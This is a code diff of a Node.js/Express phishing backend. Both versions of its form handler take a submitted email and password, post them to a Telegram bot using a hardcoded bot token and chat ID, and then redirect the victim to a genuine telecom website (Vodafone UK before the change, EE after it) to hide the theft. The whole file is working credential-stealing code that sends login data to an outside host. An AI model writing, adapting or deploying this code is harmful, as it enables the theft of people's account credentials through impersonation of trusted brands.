@@ -1,32 +1,42 @@
-// /api/submit.js
-
+// Import required modules
+const express = require('express');
 const axios = require('axios');
 
-const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Your Telegram bot token
-const chatId = '7587120060'; // Your Telegram chat ID
+// Initialize Express app
+const app = express();
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ message: 'Method not allowed' });
-  }
+// Telegram Bot API details
+const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Replace with your bot token
+const chatId = '7587120060'; // Replace with your chat ID
 
-  const { email, password } = req.body;
+// Handle POST request from the form
+app.post('/api/submit', async (req, res) => {
+    try {
+        const { email, password } = req.body;
 
-  if (!email || !password) {
-    return res.status(400).json({ message: 'Email and password are required.' });
-  }
+        // Validate input
+        if (!email || !password) {
+            return res.status(400).send('Email and password are required.');
+        }
 
-  try {
-    const message = `🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`;
+        // Prepare message for Telegram
+        const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}`;
 
-    await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
-      chat_id: chatId,
-      text: message,
-    });
+        // Send message to Telegram bot
+        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            chat_id: chatId,
+            text: message,
+        });
 
-    res.status(200).json({ redirect: 'https://www.vodafone.co.uk/ ' });
-  } catch (error) {
-    console.error('Error sending data:', error.message);
-    res.status(500).json({ message: 'Failed to process request' });
-  }
-}
+        // Redirect user to https://ee.co.uk/
+        res.redirect('https://ee.co.uk/');
+    } catch (error) {
+        console.error('Error processing request:', error);
+        res.status(500).send('An error occurred while processing your request.');
+    }
+});
+
+// Export the handler for Vercel
+module.exports = app;
